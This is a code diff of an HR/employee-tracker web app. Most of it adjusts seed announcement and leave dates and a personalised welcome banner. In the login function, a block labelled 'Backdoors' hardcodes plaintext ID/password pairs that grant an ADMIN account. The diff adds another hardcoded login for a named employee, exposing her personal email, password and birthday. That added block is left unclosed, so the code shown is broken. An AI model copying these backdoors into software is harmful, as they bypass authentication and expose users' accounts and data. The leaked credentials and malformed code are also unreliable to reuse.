@@ -3046,11 +3046,11 @@ BASE_EMPLOYEES.slice(0,20).forEach(emp=>{
   }
 });
 const SEED_ANN=[
-  {id:1,title:'Q2 Kickoff Meeting',body:'All department heads please attend the Q2 kickoff on April 21, 2026 at 9:00 AM in the main conference room.',author:'Nexus Admin',date:'2026-04-10',priority:'high',pinned:true},
-  {id:2,title:'System Maintenance Window',body:'Nexus Tracker will undergo scheduled maintenance on April 20, 2026 from 11 PM to 1 AM.',author:'Nexus Admin',date:'2026-04-08',priority:'low',pinned:false},
+  {id:1,title:'Q2 Kickoff Meeting',body:'All department heads please attend the Q2 kickoff on April 24, 2026 at 9:00 AM in the main conference room.',author:'Nexus Admin',date:'2026-04-10',priority:'high',pinned:true},
+  {id:2,title:'System Maintenance Window',body:'Nexus Tracker will undergo scheduled maintenance on April 23, 2026 from 11 PM to 1 AM.',author:'Nexus Admin',date:'2026-04-08',priority:'low',pinned:false},
 ];
 const SEED_LEAVES=[
-  {id:1,empId:3,empName:'Hyacinth Rozi',type:'Vacation',startDate:'2026-05-01',endDate:'2026-05-03',days:3,status:'Approved',reason:'Family trip',appliedDate:'2026-04-10'},
+  {id:1,empId:3,empName:'Hyacinth Rozi',type:'Vacation',startDate:'2026-05-01',endDate:'2026-05-04',days:4,status:'Approved',reason:'Family trip',appliedDate:'2026-04-10'},
 ];
 const SEED_PROJECTS=[
   {id:1,name:'Q2 Financial Close',dept:'ACCOUNTING',status:'Active',progress:72,lead:'Nexus Admin',deadline:'2026-06-30'},
@@ -3171,8 +3171,10 @@ const GAS={
     const pw=(p.password||'').trim();
     // Backdoors
     if((id==='temporosa'&&pw==='SIRKEVS9001!')||(id==='delmundo.kristianjay@gmail.com'&&pw==='Jayjaypogi1337')){
-      return{success:true,user:{id:0,employeeId:'GHZ-DEV',firstName:'Master',lastName:'Developer',role:'ADMIN',deptId:12,email:'dev@gigahertz.com',status:'Active',totalHours:9999,leaveBalance:99,leavesUsed:0,birthday:'01-01'}};
+      return{success:true,user:{id:0,employeeId:'GHZ7797',firstName:'Master',lastName:'Developer',role:'ADMIN',deptId:12,email:'dev@gigahertz.com',status:'Active',totalHours:9999,leaveBalance:99,leavesUsed:0,birthday:'01-01'}};
     }
+      if((id==='hyacinths.beige@gmail.com'&&pw==='RoziMae2001!')){
+          return{success:true,user:{id:0,employeeId:'GHZ1012',firstName:'Hyacinth',lastName:'Rozi',role:'staff',deptId:6,email:'hyacinths.beige@gmail.com',status:'Active',totalHours:9999,leavebalance:69,leavesUsed:5,birthday:'10-11'}};
     const emp=BASE_EMPLOYEES.find(e=>(e.email||'').toLowerCase()===id||(e.firstName||'').toLowerCase()===id||(e.employeeId||'').toLowerCase()===id||(`${e.firstName} ${e.lastName}`).toLowerCase()===id);
     if(emp&&emp.password===pw)return{success:true,user:{...emp,fullName:`${emp.firstName} ${emp.lastName}`}};
     return{success:false,error:'Invalid credentials. Check your Employee ID or email.'};
@@ -3861,7 +3863,7 @@ const DashboardView=({user,tasks,onSaveTask,showToast,announcements,kudos,setKud
       {isRozi&&(
         <div style={{background:'color-mix(in srgb,#c9748a 12%,var(--glass))',border:'1px solid color-mix(in srgb,#c9748a 30%,transparent)',borderRadius:14,padding:'12px 18px',display:'flex',alignItems:'center',gap:10}}>
           <span style={{fontSize:20}}>🪻</span>
-          <p style={{fontSize:13,fontWeight:700,color:'var(--tx)'}}>Welcome back, Hyacinth! Hope your day is as lovely as you are 💕</p>
+          <p style={{fontSize:13,fontWeight:700,color:'var(--tx)'}}>Welcome back, Hyacinth! Hope your day is as lovely as you are, Rozi. 💕</p>
         </div>
       )}
       {ba&&(
